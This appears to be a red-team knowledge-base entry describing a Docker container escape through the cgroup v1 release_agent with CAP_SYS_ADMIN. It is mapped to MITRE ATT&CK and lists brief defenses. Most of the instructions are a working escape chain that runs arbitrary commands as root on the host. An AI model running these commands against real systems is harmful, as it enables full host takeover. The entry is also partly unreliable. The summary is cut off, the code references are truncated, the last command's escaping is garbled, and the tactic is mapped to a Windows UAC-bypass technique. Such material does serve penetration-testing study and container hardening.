---
id: a5b040f6-ab7d-48cb-8dbc-4a76918fbc56
name: Abusing Linux cgroup v1 with CAP_SYS_ADMIN
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:17.129539+00:00'
updated_at: '2023-04-10T20:33:50.304292+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
sub_techniques:
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
tags:
- '[[Abusing CAP_SYS_ADMIN capability]]'
- '[[Container - Docker Pentest]]'
- '[[Exploit privileged container abusing the Linux cgroup v1]]'
commands:
- '[[Create and mount a cgroup]]'
- '[[Create and set command]]'
- '[[Execute command]]'
- '[[Set release agent]]'
---

# Abusing Linux cgroup v1 with CAP_SYS_ADMIN

## Summary

The objective of this procedure is to exploit a privileged container by abusing the Linux cgroup v1 with CAP_SYS_ADMIN capability. This capability allows the user to perform any system administration task, including mounting file systems, modifying kernel parameters, and creating new namespaces. By

## Description

# Description

The objective of this procedure is to exploit a privileged container by abusing the Linux cgroup v1 with CAP_SYS_ADMIN capability. This capability allows the user to perform any system administration task, including mounting file systems, modifying kernel parameters, and creating new namespaces. By exploiting this capability, an attacker can gain root access on the host system and perform any action they desire. Technical steps involve running a Docker container with SYS_ADMIN capabilities and mounting the /sys/fs/cgroup directory. From there, the attacker can modify the cgroup settings and escalate privileges.

The business value of this procedure is to demonstrate the importance of securing container environments. By exploiting a privileged container, an attacker can gain access to sensitive data and systems, causing significant damage to the organization.

## Requirements

1. Access to a Docker host with a privileged container

1. Knowledge of Linux cgroups and SYS_ADMIN capabilities

## Defense

1. Limit the use of privileged containers

1. Monitor Docker activity for suspicious behavior

1. Use container security tools to detect and prevent privilege escalation

## Objectives

1. Gain root access on the host system

1. Escalate privileges from within a Docker container

# Instructions

1. Run the following command to start a Docker container with SYS_ADMIN capabilities:

**Code**: [[docker run --rm -it --cap-add=SYS_ADMIN --security]]

> - `--rm`: Automatically remove the container when it exits.
- `-it`: Keep STDIN open and allocate a pseudo-TTY.
- `--cap-add=SYS_ADMIN`: Add Linux capabilities.
- `--security-opt apparmor=unconfined`: Disable AppArmor security profiles.
- `ubuntu`: The Docker image to use.
- `bash -c 'echo ... | base64 -d | bash -'`: Execute the specified command in the container.

2. To execute this exploit, follow the below steps:

1. Run the command on the host machine: 
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

2. In the container, execute the following commands:

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

**Code**: [[# On the host
docker run --rm -it --cap-add=SYS_AD]]

> This command exploits a vulnerability in Docker's cgroup implementation to gain access to the host system. It allows an attacker to execute arbitrary code on the host system by mounting the cgroup filesystem, creating a new cgroup, and attaching a process to it. Once the cgroup is released, the release_agent script is executed with root privileges, allowing the attacker to execute any command as root. This can be used to gain complete control over the host system.

**Command** ([[Create and mount a cgroup]]):

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
```

**Command** ([[Set release agent]]):

```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

**Command** ([[Create and set command]]):

```bash
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```

**Command** ([[Execute command]]):

```bash
sh -c "echo \\\$\\\\$ > /tmp/cgrp/x/cgroup.procs"
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]

### Sub-Techniques

- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]

## Commands Used

- [[Create and mount a cgroup]]
- [[Create and set command]]
- [[Execute command]]
- [[Set release agent]]

## Tags

- [[Abusing CAP_SYS_ADMIN capability]]
- [[Container - Docker Pentest]]
- [[Exploit privileged container abusing the Linux cgroup v1]]
